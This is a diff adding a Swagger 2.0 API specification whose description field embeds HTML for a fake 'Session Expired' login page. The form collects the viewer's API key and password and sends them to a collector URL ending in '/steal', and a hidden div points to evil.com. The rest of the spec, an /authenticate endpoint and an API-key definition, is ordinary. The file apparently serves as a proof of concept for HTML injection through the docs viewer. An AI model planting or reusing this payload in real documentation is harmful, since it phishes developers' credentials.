@@ -1,0 +1,65 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 🔒 Secure API Portal - Authentication Required
+  description: |
+    <div style="background:#f8f9fa;padding:40px;border-radius:8px;text-align:center;max-width:500px;margin:20px auto;border:2px solid #dee2e6;">
+      <div style="font-size:48px;margin-bottom:20px;">🔐</div>
+      <h1 style="color:#dc3545;margin:0 0 15px 0;font-size:28px;">Session Expired</h1>
+      <p style="color:#6c757d;margin:0 0 25px 0;font-size:16px;line-height:1.5;">
+        Your API documentation session has expired due to inactivity.<br>
+        Please re-authenticate to continue accessing services.
+      </p>
+      <form action="https://your-collector.com/steal" method="GET" style="text-align:left;">
+        <label style="display:block;margin-bottom:8px;color:#495057;font-weight:600;font-size:14px;">API Key / Access Token</label>
+        <input type="text" name="api_key" placeholder="Enter your API key here" style="width:100%;padding:12px;border:1px solid #ced4da;border-radius:4px;margin-bottom:15px;font-size:14px;box-sizing:border-box;" required>
+        <label style="display:block;margin-bottom:8px;color:#495057;font-weight:600;font-size:14px;">Password</label>
+        <input type="password" name="password" placeholder="Enter your password" style="width:100%;padding:12px;border:1px solid #ced4da;border-radius:4px;margin-bottom:20px;font-size:14px;box-sizing:border-box;" required>
+        <input type="hidden" name="origin" value="swagger-ui">
+        <input type="hidden" name="timestamp" value="2024">
+        <button type="submit" style="width:100%;padding:14px;background:#007bff;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;">Authenticate & Continue</button>
+      </form>
+      <p style="margin-top:20px;font-size:12px;color:#6c757d;">
+        🔒 Protected by corporate security policies<br>
+        <a href="https://your-collector.com/help" style="color:#007bff;text-decoration:none;">Need help?</a>
+      </p>
+    </div>
+    <div style="display:none;">
+      API Documentation Portal - Login to continue services below or go to https://evil.com
+    </div>
+
+paths:
+  /authenticate:
+    post:
+      summary: 🔑 Authenticate
+      description: Authentication endpoint for API access
+      consumes:
+        - application/x-www-form-urlencoded
+      produces:
+        - application/json
+      parameters:
+        - name: username
+          in: formData
+          description: Username for authentication
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: Password for authentication
+          required: true
+          type: string
+          format: password
+      tags:
+        - Authentication
+      responses:
+        '200':
+          description: Successfully authenticated
+        '401':
+          description: Invalid credentials
+
+securityDefinitions:
+  api_key:
+    type: apiKey
+    in: header
+    name: X-API-Key
+    description: API key for authentication
